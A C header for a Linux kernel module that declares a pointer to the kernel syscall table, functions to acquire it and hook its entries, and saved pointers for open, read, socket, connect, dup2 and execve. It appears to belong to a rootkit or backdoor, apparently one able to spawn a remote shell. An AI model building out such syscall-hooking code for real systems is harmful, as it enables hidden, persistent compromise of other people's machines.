#ifndef _SYSCALLTABLE_H
#define _SYSCALLTABLE_H
#include <net/sock.h>

typedef asmlinkage long (*t_sys_open)(const char __user *, int, umode_t);
typedef asmlinkage long (*t_sys_dup)(unsigned int);
typedef asmlinkage long (*t_sys_socket)(int, int, int);
typedef asmlinkage long (*t_sys_connect)(int, struct sockaddr __user *, int);
typedef asmlinkage long (*t_sys_dup2)(unsigned int, unsigned int);
typedef asmlinkage long (*t_sys_execve)(const char __user *, const char __user **, const char __user **);
typedef asmlinkage long (*t_sys_read)(unsigned int, char __user *, size_t);

extern unsigned long **g_syscalltable;

extern t_sys_open g_sys_open;
extern t_sys_dup g_sys_dup;
extern t_sys_socket g_sys_socket;
extern t_sys_connect g_sys_connect;
extern t_sys_dup2 g_sys_dup2;
extern t_sys_execve g_sys_execve;
extern t_sys_read g_sys_read;

unsigned long **aquire_sys_call_table(void);
bool init_syscall(void);
bool hook_syscall(unsigned int nr_call, void *dest_func);

#endif
